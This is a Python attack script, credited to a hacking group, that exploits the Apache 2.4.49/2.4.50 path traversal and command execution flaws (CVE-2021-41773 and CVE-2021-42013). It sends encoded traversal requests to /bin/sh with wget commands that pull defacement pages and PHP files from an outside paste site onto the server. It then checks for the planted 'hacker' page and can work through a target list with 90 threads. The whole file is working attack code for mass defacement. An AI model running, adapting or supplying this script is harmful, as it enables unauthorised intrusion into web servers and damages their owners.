# !/usr/bin/python3
import os,sys,time
import requests,random
from concurrent.futures import ThreadPoolExecutor


# exploit tools 
# title : apache/2.4.49 and apache/2.4.50
# CVE-2021-41773 | CVE-2021-42013
# creator : Muslim Hackers Coummunity
# date : 17 april 2024


try:
    class ar:
        def value(self,name):
            try:
                all=sys.argv
                count=0
                for line in all:
                    count+=1
                    if line==name:
                        value=all[count]
                        return value
            except IndexError:
                print("Error found.")

        def name(self,name):
            all = sys.argv
            for line in all:
                if line==name:
                    value=name
                    return value

        def help(self,ms):
            print(ms)
            sys.exit()
except:
    print("Not found value.Plase check command")


def agent():
    agents = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0','Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4']
    return {"User-Agent":random.choice(agents)}

def add_http(url):
    if not url.startswith("http"):
        url = f"http://{url}"
    if not url.endswith("/"):
        url = f"{url}/"
    return url

def exploit(url):

    html = 'wget -O mhc.html https://paste.myconan.net/494870.txt'
    php = 'wget -O mhc.php https://paste.myconan.net/494871.txt'
    txt = 'wget -O mhc.txt https://paste.myconan.net/494872.txt'
    deface = ['wget -O mhc.php https://paste.myconan.net/494871.txt','wget -O /tam/mhc.php https://paste.myconan.net/494871.txt']
    urls = []
    paths = ["cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e","icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e","cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"]
    for path in paths:
        urls.append(f"{url}{path}")
    for url1 in urls:
        for cmd in deface:
            head = agent()
            payload = f"echo Content-Type: text/plain; echo; {cmd}"
            req = requests.post(url1,data=payload,headers=head)


    ok = ['tam/mhc.php','mhc.php']
    faild = False
    for url2 in ok:
        url2 = url + url2
        head1 = agent()
        req1 = requests.get(url2,headers=head1)
        if req1.status_code==200:
            if "hacker" in req1.text:
                faild = True
                print(f"upload : {url2}")

    if not faild:
        print(f"non vulnerable {url}")



def main():
    arg = ar()
    help = arg.name("-h")
    target = arg.value("-t")
    file = arg.value("-T")
    ch = False

    if help:
        print(f"\nuse exeample : python3 {sys.argv[0]}\n\n-h    help options\n-t    target website\n-T  target website list")
        sys.exit()

    if target:
        ch = True
    if file:
        ch = True

    if not ch:
        print("set target website.")
        sys.exit()

    if target:
        target = add_http(target)
        with ThreadPoolExecutor(max_workers=90) as executor:
            executor.submit(exploit,target)
        sys.exit()
    if file:
        try:
            rd = open(file,"r",encoding="utf-8")
            rd1 = rd.read()
            with ThreadPoolExecutor(max_workers=90) as executor:
                for line in rd1.splitlines():
                    executor.submit(exploit,line)
            rd.close()
        except FileNotFoundError:
            print(f"{file} : not found")


main()
